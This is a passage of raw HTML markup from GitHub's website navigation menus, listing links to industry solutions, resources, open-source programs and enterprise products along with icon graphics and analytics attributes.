href="https://github.com/solutions/industry/financial-services" data-analytics-event="{&quot;action&quot;:&quot;financial_services&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;financial_services_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Financial services</span></a></li><li><a href="https://github.com/solutions/industry/manufacturing" data-analytics-event="{&quot;action&quot;:&quot;manufacturing&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;manufacturing_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Manufacturing</span></a></li><li><a href="https://github.com/solutions/industry/government" data-analytics-event="{&quot;action&quot;:&quot;government&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;government_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Government</span></a></li><li><a href="https://github.com/solutions/industry" data-analytics-event="{&quot;action&quot;:&quot;view_all_industries&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;view_all_industries_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">View all industries</span><svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavLink-module__arrowIcon--g6Lip" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></a></li></ul></div></li></ul><div class="NavDropdown-module__trailingLinkContainer--MNB5T"><a href="https://github.com/solutions" data-analytics-event="{&quot;action&quot;:&quot;view_all_solutions&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;solutions&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;view_all_solutions_link_solutions_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">View all solutions</span><svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavLink-module__arrowIcon--g6Lip" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></a></div></div></div></li><li><div class="NavDropdown-module__container--bmXM2 js-details-container js-header-menu-item"><button type="button" class="NavDropdown-module__button--Hq9UR js-details-target" aria-expanded="false">Resources<svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavDropdown-module__buttonIcon--SR0Ke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></button><div class="NavDropdown-module__dropdown--Ig57Y"><ul class="NavDropdown-module__list--RwSSK"><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">EXPLORE BY TOPIC</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/resources/articles?topic=ai" data-analytics-event="{&quot;action&quot;:&quot;ai&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;ai_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">AI</span></a></li><li><a href="https://github.com/resources/articles?topic=software-development" data-analytics-event="{&quot;action&quot;:&quot;software_development&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;software_development_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Software Development</span></a></li><li><a href="https://github.com/resources/articles?topic=devops" data-analytics-event="{&quot;action&quot;:&quot;devops&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;devops_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">DevOps</span></a></li><li><a href="https://github.com/resources/articles?topic=security" data-analytics-event="{&quot;action&quot;:&quot;security&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;security_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Security</span></a></li><li><a href="https://github.com/resources/articles" data-analytics-event="{&quot;action&quot;:&quot;view_all_topics&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;view_all_topics_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">View all topics</span><svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavLink-module__arrowIcon--g6Lip" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">EXPLORE BY TYPE</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/customer-stories" data-analytics-event="{&quot;action&quot;:&quot;customer_stories&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;customer_stories_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Customer stories</span></a></li><li><a href="https://github.com/resources/events" data-analytics-event="{&quot;action&quot;:&quot;events__webinars&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;events__webinars_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Events &amp; webinars</span></a></li><li><a href="https://github.com/resources/whitepapers" data-analytics-event="{&quot;action&quot;:&quot;ebooks__reports&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;ebooks__reports_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Ebooks &amp; reports</span></a></li><li><a href="https://github.com/solutions/executive-insights" data-analytics-event="{&quot;action&quot;:&quot;business_insights&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;business_insights_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Business insights</span></a></li><li><a href="https://skills.github.com" data-analytics-event="{&quot;action&quot;:&quot;github_skills&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_skills_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">GitHub Skills</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">SUPPORT &amp; SERVICES</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://docs.github.com" data-analytics-event="{&quot;action&quot;:&quot;documentation&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;documentation_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Documentation</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://support.github.com" data-analytics-event="{&quot;action&quot;:&quot;customer_support&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;customer_support_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Customer support</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://github.com/orgs/community/discussions" data-analytics-event="{&quot;action&quot;:&quot;community_forum&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;community_forum_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Community forum</span></a></li><li><a href="https://github.com/trust-center" data-analytics-event="{&quot;action&quot;:&quot;trust_center&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;trust_center_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Trust center</span></a></li><li><a href="https://github.com/partners" data-analytics-event="{&quot;action&quot;:&quot;partners&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;resources&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;partners_link_resources_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Partners</span></a></li></ul></div></li></ul></div></div></li><li><div class="NavDropdown-module__container--bmXM2 js-details-container js-header-menu-item"><button type="button" class="NavDropdown-module__button--Hq9UR js-details-target" aria-expanded="false">Open Source<svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavDropdown-module__buttonIcon--SR0Ke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></button><div class="NavDropdown-module__dropdown--Ig57Y"><ul class="NavDropdown-module__list--RwSSK"><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">COMMUNITY</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/sponsors" data-analytics-event="{&quot;action&quot;:&quot;github_sponsors&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_sponsors_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-sponsor-tiers NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M16.004 1.25C18.311 1.25 20 3.128 20 5.75c0 2.292-1.23 4.464-3.295 6.485-.481.47-.98.909-1.482 1.31l.265 1.32 1.375 7.5a.75.75 0 0 1-.982.844l-3.512-1.207a.75.75 0 0 0-.488 0L8.37 23.209a.75.75 0 0 1-.982-.844l1.378-7.512.261-1.309c-.5-.4-1-.838-1.481-1.31C5.479 10.215 4.25 8.043 4.25 5.75c0-2.622 1.689-4.5 3.996-4.5 1.55 0 2.947.752 3.832 1.967l.047.067.047-.067a4.726 4.726 0 0 1 3.612-1.962l.22-.005ZM13.89 14.531c-.418.285-.828.542-1.218.77l-.18.103a.75.75 0 0 1-.734 0l-.071-.04-.46-.272c-.282-.173-.573-.36-.868-.562l-.121.605-1.145 6.239 2.3-.79a2.248 2.248 0 0 1 1.284-.054l.18.053 2.299.79-1.141-6.226-.125-.616ZM16.004 2.75c-1.464 0-2.731.983-3.159 2.459-.209.721-1.231.721-1.44 0-.428-1.476-1.695-2.459-3.16-2.459-1.44 0-2.495 1.173-2.495 3 0 1.811 1.039 3.647 2.844 5.412a19.624 19.624 0 0 0 3.734 2.84l-.019-.011-.184-.111.147-.088a19.81 19.81 0 0 0 3.015-2.278l.37-.352C17.46 9.397 18.5 7.561 18.5 5.75c0-1.827-1.055-3-2.496-3Z"></path></svg><span class="NavLink-module__title--xw3ok">GitHub Sponsors</span><span class="NavLink-module__subtitle--qC15H">Fund open source developers</span></div></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">PROGRAMS</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://securitylab.github.com" data-analytics-event="{&quot;action&quot;:&quot;security_lab&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;security_lab_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Security Lab</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://maintainers.github.com" data-analytics-event="{&quot;action&quot;:&quot;maintainer_community&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;maintainer_community_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Maintainer Community</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li><li><a href="https://github.com/accelerator" data-analytics-event="{&quot;action&quot;:&quot;accelerator&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;accelerator_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Accelerator</span></a></li><li><a href="https://archiveprogram.github.com" data-analytics-event="{&quot;action&quot;:&quot;archive_program&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;archive_program_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB" target="_blank" rel="noreferrer"><span class="NavLink-module__title--xw3ok">Archive Program</span><svg aria-hidden="true" focusable="false" class="octicon octicon-link-external NavLink-module__externalIcon--JurQ9" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M3.75 2h3.5a.75.75 0 0 1 0 1.5h-3.5a.25.25 0 0 0-.25.25v8.5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-3.5a.75.75 0 0 1 1.5 0v3.5A1.75 1.75 0 0 1 12.25 14h-8.5A1.75 1.75 0 0 1 2 12.25v-8.5C2 2.784 2.784 2 3.75 2Zm6.854-1h4.146a.25.25 0 0 1 .25.25v4.146a.25.25 0 0 1-.427.177L13.03 4.03 9.28 7.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.75-3.75-1.543-1.543A.25.25 0 0 1 10.604 1Z"></path></svg></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">REPOSITORIES</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/topics" data-analytics-event="{&quot;action&quot;:&quot;topics&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;topics_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Topics</span></a></li><li><a href="https://github.com/trending" data-analytics-event="{&quot;action&quot;:&quot;trending&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;trending_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Trending</span></a></li><li><a href="https://github.com/collections" data-analytics-event="{&quot;action&quot;:&quot;collections&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;collections_link_open_source_navbar&quot;}" class="NavLink-module__link--n48VB"><span class="NavLink-module__title--xw3ok">Collections</span></a></li></ul></div></li></ul></div></div></li><li><div class="NavDropdown-module__container--bmXM2 js-details-container js-header-menu-item"><button type="button" class="NavDropdown-module__button--Hq9UR js-details-target" aria-expanded="false">Enterprise<svg aria-hidden="true" focusable="false" class="octicon octicon-chevron-right NavDropdown-module__buttonIcon--SR0Ke" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M6.22 3.22a.75.75 0 0 1 1.06 0l4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L9.94 8 6.22 4.28a.75.75 0 0 1 0-1.06Z"></path></svg></button><div class="NavDropdown-module__dropdown--Ig57Y"><ul class="NavDropdown-module__list--RwSSK"><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">ENTERPRISE SOLUTIONS</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/enterprise" data-analytics-event="{&quot;action&quot;:&quot;enterprise_platform&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;enterprise_platform_link_enterprise_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-stack NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M11.063 1.456a1.749 1.749 0 0 1 1.874 0l8.383 5.316a1.751 1.751 0 0 1 0 2.956l-8.383 5.316a1.749 1.749 0 0 1-1.874 0L2.68 9.728a1.751 1.751 0 0 1 0-2.956Zm1.071 1.267a.25.25 0 0 0-.268 0L3.483 8.039a.25.25 0 0 0 0 .422l8.383 5.316a.25.25 0 0 0 .268 0l8.383-5.316a.25.25 0 0 0 0-.422Z"></path><path d="M1.867 12.324a.75.75 0 0 1 1.035-.232l8.964 5.685a.25.25 0 0 0 .268 0l8.964-5.685a.75.75 0 0 1 .804 1.267l-8.965 5.685a1.749 1.749 0 0 1-1.874 0l-8.965-5.685a.75.75 0 0 1-.231-1.035Z"></path><path d="M1.867 16.324a.75.75 0 0 1 1.035-.232l8.964 5.685a.25.25 0 0 0 .268 0l8.964-5.685a.75.75 0 0 1 .804 1.267l-8.965 5.685a1.749 1.749 0 0 1-1.874 0l-8.965-5.685a.75.75 0 0 1-.231-1.035Z"></path></svg><span class="NavLink-module__title--xw3ok">Enterprise platform</span><span class="NavLink-module__subtitle--qC15H">AI-powered developer platform</span></div></a></li></ul></div></li><li><div class="NavGroup-module__group--T925n"><span class="NavGroup-module__title--TdKyz">AVAILABLE ADD-ONS</span><ul class="NavGroup-module__list--M8eGv"><li><a href="https://github.com/security/advanced-security" data-analytics-event="{&quot;action&quot;:&quot;github_advanced_security&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;github_advanced_security_link_enterprise_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-shield-check NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M16.53 9.78a.75.75 0 0 0-1.06-1.06L11 13.19l-1.97-1.97a.75.75 0 0 0-1.06 1.06l2.5 2.5a.75.75 0 0 0 1.06 0l5-5Z"></path><path d="m12.54.637 8.25 2.675A1.75 1.75 0 0 1 22 4.976V10c0 6.19-3.771 10.704-9.401 12.83a1.704 1.704 0 0 1-1.198 0C5.77 20.705 2 16.19 2 10V4.976c0-.758.489-1.43 1.21-1.664L11.46.637a1.748 1.748 0 0 1 1.08 0Zm-.617 1.426-8.25 2.676a.249.249 0 0 0-.173.237V10c0 5.46 3.28 9.483 8.43 11.426a.199.199 0 0 0 .14 0C17.22 19.483 20.5 15.461 20.5 10V4.976a.25.25 0 0 0-.173-.237l-8.25-2.676a.253.253 0 0 0-.154 0Z"></path></svg><span class="NavLink-module__title--xw3ok">GitHub Advanced Security</span><span class="NavLink-module__subtitle--qC15H">Enterprise-grade security features</span></div></a></li><li><a href="https://github.com/features/copilot/copilot-business" data-analytics-event="{&quot;action&quot;:&quot;copilot_for_business&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;copilot_for_business_link_enterprise_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-copilot NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M23.922 16.992c-.861 1.495-5.859 5.023-11.922 5.023-6.063 0-11.061-3.528-11.922-5.023A.641.641 0 0 1 0 16.736v-2.869a.841.841 0 0 1 .053-.22c.372-.935 1.347-2.292 2.605-2.656.167-.429.414-1.055.644-1.517a10.195 10.195 0 0 1-.052-1.086c0-1.331.282-2.499 1.132-3.368.397-.406.89-.717 1.474-.952 1.399-1.136 3.392-2.093 6.122-2.093 2.731 0 4.767.957 6.166 2.093.584.235 1.077.546 1.474.952.85.869 1.132 2.037 1.132 3.368 0 .368-.014.733-.052 1.086.23.462.477 1.088.644 1.517 1.258.364 2.233 1.721 2.605 2.656a.832.832 0 0 1 .053.22v2.869a.641.641 0 0 1-.078.256ZM12.172 11h-.344a4.323 4.323 0 0 1-.355.508C10.703 12.455 9.555 13 7.965 13c-1.725 0-2.989-.359-3.782-1.259a2.005 2.005 0 0 1-.085-.104L4 11.741v6.585c1.435.779 4.514 2.179 8 2.179 3.486 0 6.565-1.4 8-2.179v-6.585l-.098-.104s-.033.045-.085.104c-.793.9-2.057 1.259-3.782 1.259-1.59 0-2.738-.545-3.508-1.492a4.323 4.323 0 0 1-.355-.508h-.016.016Zm.641-2.935c.136 1.057.403 1.913.878 2.497.442.544 1.134.938 2.344.938 1.573 0 2.292-.337 2.657-.751.384-.435.558-1.15.558-2.361 0-1.14-.243-1.847-.705-2.319-.477-.488-1.319-.862-2.824-1.025-1.487-.161-2.192.138-2.533.529-.269.307-.437.808-.438 1.578v.021c0 .265.021.562.063.893Zm-1.626 0c.042-.331.063-.628.063-.894v-.02c-.001-.77-.169-1.271-.438-1.578-.341-.391-1.046-.69-2.533-.529-1.505.163-2.347.537-2.824 1.025-.462.472-.705 1.179-.705 2.319 0 1.211.175 1.926.558 2.361.365.414 1.084.751 2.657.751 1.21 0 1.902-.394 2.344-.938.475-.584.742-1.44.878-2.497Z"></path><path d="M14.5 14.25a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Zm-5 0a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Z"></path></svg><span class="NavLink-module__title--xw3ok">Copilot for Business</span><span class="NavLink-module__subtitle--qC15H">Enterprise-grade AI features</span></div></a></li><li><a href="https://github.com/premium-support" data-analytics-event="{&quot;action&quot;:&quot;premium_support&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;premium_support_link_enterprise_navbar&quot;}" class="NavLink-module__link--n48VB"><div class="NavLink-module__text--SdWkb"><svg aria-hidden="true" focusable="false" class="octicon octicon-comment-discussion NavLink-module__icon--h0sw7" viewBox="0 0 24 24" width="24" height="24" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 14.25 14H8.061l-2.574 2.573A1.458 1.458 0 0 1 3 15.543V14H1.75A1.75 1.75 0 0 1 0 